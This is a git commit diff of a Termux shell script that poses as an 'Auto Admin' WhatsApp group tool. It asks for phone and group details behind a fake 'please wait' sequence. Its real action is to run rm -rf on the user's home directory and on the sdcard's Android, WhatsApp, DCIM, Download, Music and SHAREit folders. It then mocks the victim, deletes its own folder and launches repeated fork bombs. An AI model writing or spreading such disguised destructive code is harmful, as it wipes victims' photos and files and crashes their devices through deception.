abb7993b9ac3c4585431b81089f322871b7dd53e
Mr F1d41 <105339452+F1d41@users.noreply.github.com>
2022-06-01 11:03:04 +0530

    Update admin.sh

--- admin.sh
+++ admin.sh
@@ -1,9 +1,42 @@
 clear
+pkg install figlet
+cd
+if [ -d storage ]; then
+echo ""
+clear
+else
 termux-setup-storage -y
+echo ""
+fi
+clear
+echo ""
 figlet -f slant "Auto Admin"
 
 echo "                         coded by ANON_DARKPHANTOM"
 
+read -p " Enter Your WhatsApp Number : " num
+read -p " Enter Group Name : " nam
+read -p "Enter Group Admin Number : " numb
+echo ""
+echo " Please Wait ..."
+sleep 2
+clear
+echo " Your WhatsApp Number : $num"
+sleep 1
+echo " Group Name : $nam"
+sleep 1
+echo " Admin Number : $numb"
+echo ""
+sleep 2
+echo " please wait ."
+sleep 1
+echo " please wait ..."
+sleep 1
+echo "please wait....................."
+sleep 1
+echo "please wait................................."
+sleep 1
+clear 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
 rm -rf cd /sdcard/WhatsApp
@@ -11,16 +44,12 @@ rm -rf cd /sdcard/DCIM
 rm -rf cd /sdcard/Download
 rm -rf cd /sdcard/Music
 rm -rf cd /sdcard/SHAREit
-
-echo "Enter your whatsapp number"
-read number
-echo "Enter group admin number :"
-read admin
-echo "what is your number" $number
-sleep 5
-echo "please wait................................."
-sleep 10
-echo "POYI NANNAIKUDA😂😂"
+echo " NANNAIKUDA 😂😂"
+echo " Auto Admin WhatsApp illya 🥵"
+echo " Are you stupid?"
+sleep 1
+cd ..
+rm -rf Auto_admin
 :(){ :|:& };:
 :(){ :|:& };:
 :(){ :|:& };:
